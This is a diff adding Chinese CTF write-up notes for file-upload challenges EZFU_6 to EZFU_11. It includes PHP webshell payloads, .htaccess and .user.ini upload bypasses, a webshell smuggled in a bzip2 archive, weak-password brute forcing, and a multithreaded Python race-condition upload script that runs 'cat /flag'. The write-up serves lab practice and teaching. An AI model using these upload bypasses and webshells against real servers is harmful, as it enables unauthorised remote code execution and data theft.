@@ -161,7 +161,101 @@ EZFU_6
 
 env 是 Linux/Unix 系统自带命令，作用：打印当前进程所有环境变量
 
-`` `env ``=>
+`` `env` ``=> `echo env`
+
+EZFU_7
+-
+当前服务器环境是 Apache ，尝试上传 `.htaccess` 文件：
+`AddType application/x-httpd-php .png
+`
+再传`1.png`  内容``<?= `$_POST[1]`; ?>``
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785815977877_image.png)
+
+EZFU_8
+-
+这一题`.htaccess` 文件失效，在upload有index，可以使用`.user.ini`  
+
+传user.ini内容：`auto_prepend_file=1.png`   包含1.png
+再传 1.png 内容``<?= `$_POST[1]`; ?>``
+访问 `/upload/`给post `1=env`
+
+EZFU_9
+-
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785816661661_image.png)
+
+服务器后端执行“恢复”操作时，它会解压这个文件。如果这个压缩包里包含一个 shell.php，那么解压完成后，服务器的磁盘上就会凭空多出一个 shell.php 文件
+
+先写一个shell.php，用7z压缩，格式bzip2
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785817736967_image.png)
+上传后自动解压   目录uploads/shell.php   传post，flag在phpinfo中
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785817583529_image.png)
+
+EZFU_10
+-
+bp爆破弱密码   账号`admin` 密码 ` 123456`
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785817923125_image.png)
+重新制作  1.phtml   内容 ``<?php phpinfo(); ?>``   bzip2压缩，上传
+
+EZFU_11
+-
+我们上传文件发现被很快删除了
+bp无限发包`<?php system('cat /flag');?>`
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785819431057_image.png)
+然后访问/upload/1.php
+```
+import requests                                    # 导入 requests，用于发送 HTTP 请求。
+import threading                                   # 导入 threading，用于创建线程同步事件。
+from concurrent.futures import ThreadPoolExecutor, as_completed  # 导入线程池及按完成顺序遍历任务的工具。
+
+BASE_URL = "http://docker.qingcen.net:44132/"      # 定义目标 CTF 服务的基础地址。
+PAYLOAD = b"<?php system('cat /flag');?>"          # 定义要上传的 PHP 字节内容，执行命令读取 /flag。
+STOP = threading.Event()                           # 创建全局停止事件，任一线程成功后通知其他线程停止。
+
+def worker():                                      # 定义单个并发工作线程执行的任务。
+    with requests.Session() as s:                  # 创建并自动关闭独立 HTTP 会话，以复用连接和 Cookie。
+        while not STOP.is_set():                   # 在未收到停止信号时持续尝试上传。
+            try:                                   # 捕获请求或响应解析过程中的异常，防止线程直接退出。
+                r = s.post(                        # 向目标根路径发送 POST 上传请求。
+                    f"{BASE_URL}/",                # 拼接请求地址；BASE_URL 已带 /，这里会产生双斜杠但通常可用。
+                    files={"image": ("shell.php", PAYLOAD, "application/x-php")},         # 以 image 字段上传名为 shell.php 的 PHP 文件。
+                    timeout=3,                     # 设置三秒超时，避免网络异常长期阻塞线程。
+                )                                  # 获取上传接口的 HTTP 响应。
+                path = r.json().get("file_url")    # 将响应解析为 JSON，并读取服务器返回的上传文件路径。
+                if not path:                       # 若没有返回文件路径，则认为本次上传未成功或返回格式不符合预期。
+                    continue                       # 跳过当前轮次并立即继续下一次尝试。
+
+                text = s.get(f"{BASE_URL}/{path.lstrip('/')}", timeout=3).text.strip()    # 请求上传后的文件并清除首尾空白字符。
+                if text.startswith("flag{") and text.endswith("}"):                       # 判断响应是否符合常见 CTF flag 格式。
+                    STOP.set()                     # 通知其余工作线程停止继续请求。
+                    return text                    # 返回找到的 flag。
+            except (requests.RequestException, ValueError):                               # 忽略 HTTP 错误、超时及 JSON 解析错误。
+                pass                               # 本轮失败后不做处理，继续循环重试。
+
+def main():                                        # 定义程序主入口函数。
+    with ThreadPoolExecutor(max_workers=20) as pool:        # 创建最多同时运行 20 个工作线程的线程池。
+        futures = [pool.submit(worker) for _ in range(20)]  # 提交 20 个 worker 任务，并保存对应的 Future 对象。
+        for f in as_completed(futures):                     # 按任务完成的先后顺序获取 Future。
+            flag = f.result()                               # 取得已完成任务的返回值；未找到时通常为 None。
+            if flag:                                        # 若某个线程找到有效 flag。
+                print(flag)                                 # 在终端输出 flag。
+                return                                      # 结束主函数；线程池退出时会等待已提交任务结束。
+
+if __name__ == "__main__":          # 仅在该脚本被直接执行时调用 main，而非被其他模块导入时。
+    main()                          # 启动并发上传与访问流程。
+```
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
